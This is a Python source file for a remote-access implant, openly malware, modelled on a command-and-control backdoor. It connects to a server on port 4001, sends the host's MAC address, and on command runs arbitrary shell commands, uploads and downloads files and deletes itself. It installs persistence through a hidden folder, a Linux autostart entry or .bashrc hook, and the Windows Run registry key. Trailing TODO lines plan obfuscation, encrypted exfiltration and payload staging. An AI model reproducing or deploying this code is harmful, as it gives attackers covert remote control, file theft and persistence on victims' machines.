import os
import socket
import uuid
import subprocess
import platform
import getpass
import sys
import shutil

class Implant(object):

    def __init__(self):

        self.platform = platform.system() + "_" + platform.release()
        self.mac = hex(uuid.getnode())
        self.uid = getpass.getuser() + "_" + str(self.mac)
        self.installed = self.is_installed()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect('127.0.0.1', 4001)
        self.sock.send(str(self.mac).encode())

    def is_installed(self):
        install_dir = None
        if platform.system() == "Linux":
            install_dir = self.os_path_expansion("~/.implant")
        elif platform.system() == "Windows":
            install_dir = os.path.join(os.getenv("USERPROFILE"), "implant")
        if os.path.exists(install_dir):
            return install_dir
        else:
            return None

    def persist(self):
        # Install the implant
        # Note: can only install compiled implants
        # Is the implant compiled? (Pyinstaller adds the frozen value to the "sys" object)
        if not getattr(sys, "frozen", False):
            # TODO server response: can only install compiled implants
            return
        if self.installed:
            # TODO server response: already installed
            return
        if platform.system() == "Linux":
            install_dir = self.os_path_expansion("~/.implant")
            if not os.path.exists(install_dir):
                os.makedirs(install_dir)
            install_path = os.path.join(install_dir, os.path.basename(sys.executable))
            # Copy the executable into the installation directory, in the current user's home (~/.implant) in a
            # hidden folder.
            shutil.copyfile(sys.executable, install_path)
            os.system("chmod +x " + install_path)
            if os.path.exists(self.os_path_expansion("~/.config/autostart/")):
                # If the "autostart" directory exists, we can install ourselves there with a desktop entry
                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Implant\nExec=%s\n" % install_path
                with open(self.os_path_expansion('~/.config/autostart/implant.desktop'), 'w') as file:
                    file.write(desktop_entry)
            else:
                with open(self.os_path_expansion("~/.bashrc"), "a") as file:
                    file.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + install_path + ";fi&)\n")
        elif platform.system() == "Windows":
            install_dir = os.path.join(os.getenv('USERPROFILE'), "Implant")
            if not os.path.exists(install_dir):
                os.makedirs(install_dir)
            install_path = os.path.join(install_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, install_path)
            reg_cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v implant /t REG_SZ /d \"%s\"" % install_path
            subprocess.Popen(reg_cmd, shell=True)
        # TODO server response: installed successfully

    def remove(self):
        # Uninstall the implant
        if platform.system() == "Linux":
            install_dir = self.os_path_expansion("~/.implant")
            if os.path.exists(install_dir):
                shutil.rmtree(install_dir)
            desktop_entry = self.os_path_expansion("~/.config/autostart/implant.desktop")
            if os.path.exists(desktop_entry):
                os.remove(desktop_entry)
            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
        elif platform.system() == "Windows":
            install_dir = os.path.join(os.getenv('USERPROFILE'), "implant")
            reg_cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v implant"
            subprocess.Popen(reg_cmd, shell=True)
            reg_cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v implant /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (install_dir, install_dir)
            subprocess.Popen(reg_cmd, shell=True)
        self.sock.send("implant removed".encode())

    def kill(self):
        self.sock.send("implant killed".encode())
        sys.exit(0)

    def os_path_expansion(self, path):
        # Used for expanding relative paths based on working directory
        return os.path.expandvars(os.path.expanduser(path))

    def upload(self, data):
        # print('uploading ' + data)
        upload_file = open(data, "rb")
        l = upload_file.read()
        while (l):
            print(l)
            self.sock.send(l)
            l = upload_file.read(8192)
            if not l:
                break
        upload_file.close()
        # print("done")
        self.sock.send("ENDOFFILE".encode())

    def download(self, data):
        file = open(data, "wb")
        while True:
            data = self.sock.recv(8192)
            if not data or data == b'':
                break
            if data.__contains__(b'ENDOFFILE'):
                data = data[:data.index(b'ENDOFFILE')]
                file.write(data)
                break
            file.write(data)

    def command(self, data):
        proc = subprocess.Popen(data, stdout=subprocess.PIPE)
        self.sock.send(str(proc.communicate()[0]).encode())

    def cd(self, data):
        os.chdir(data)
        self.sock.send(("moved to " + os.getcwd() + "\n").encode())

    def run(self):
        while(True):
            data = self.sock.recv(1024).decode()
            if data.split()[0] == "upload":
                self.upload(data[7:])
            elif data.split()[0] == "download":
                self.download(data[9:])
            elif data.split()[0] == "cmd":
                self.command(data[4:])
            elif data.split()[0] == "cd":
                self.cd(data[3:])
            elif data.split()[0] == "kill":
                self.kill()
            elif data.split()[0] == "persist":
                self.persist()


def main():
    implant = Implant()
    implant.run()


if __name__ == "__main__":
    main()


# with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
#     s.connect('127.0.0.1', 4001)
#     mac = hex(uuid.getnode())
#     print(mac)
#     s.send(str(mac).encode())
#     while(1):
#         data = s.recv(1024).decode()
#         print(data)
#         if data.split()[0] == 'upload':
#             data = data[7:]
#             print('uploading ' + data)
#             f = open(data, 'rb')
#             l = f.read()
#             while (l):
#                 print(l)
#                 s.send(l)
#                 l = f.read(8192)
#                 if not l:
#                     break
#             f.close()
#             print('done')
#             s.send('ENDOFFILE'.encode())
#         if data.split()[0] == 'cmd':
#             data = data[4:]
#             proc = subprocess.Popen(data,stdout=subprocess.PIPE)
#             s.send(str(proc.communicate()[0]).encode())
#         if data.split()[0] == 'chdir':
#             data = data[6:]
#             os.chdir(data)
#             msg = 'Contents of ' + os.getcwd() + '\n'
#             s.send(msg.encode())
#             # if platform.system() == 'Windows':
#             #     proc = subprocess.Popen('dir',stdout=subprocess.PIPE)
#             #     s.send(str(proc.communicate()[0]).encode())
#             # elif platform.system() == 'Linux':
#             #     proc = subprocess.Popen('ls -la', stdout=subprocess.PIPE)
#             #     s.send(str(proc.communicate()[0]).encode())
#         if data.split()[0] == 'killimplant':
#             s.send('it was nice knowing you'.encode())
#             proc = subprocess.Popen("rm implant.py --force", stdout=subprocess.PIPE)
#             proc.communicate()
#             s.close()
#             exit



#TODO: Persistence Plan
#TODO: Sending Files to Implant
#TODO: Communicating with New Payloads
#TODO: Stretch Goal: SMART Directory Traversal -- Find and only run in directories with -rwx
#TODO: Using Implant to Move Payloads then die
#TODO: Package Implant + Payloads with PyInstaller
#TODO: Encrypt/Obfuscate Data Being Sent
#TODO: Obfuscate the Source Files

